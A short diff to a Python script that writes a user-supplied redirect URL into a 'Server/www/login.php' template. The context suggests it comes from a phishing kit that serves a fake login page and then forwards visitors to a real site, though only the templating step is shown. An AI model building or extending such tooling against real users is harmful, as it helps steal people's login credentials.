@@ -128,7 +128,12 @@ def localhost():
 def redirect():
     redirect = input(yellow + "URL redirect to: ")
     if 'http://' in redirect or 'https://' in redirect:
-        pass
+        with open('Server/www/login.php') as f:
+            read = f.read()
+        r = read.replace('<REDIRECT>', redirect)
+        w = open('Server/www/login.php', 'w')
+        w.write(r)
+        w.close()
     
     else:
         redirect = 'https://' + redirect
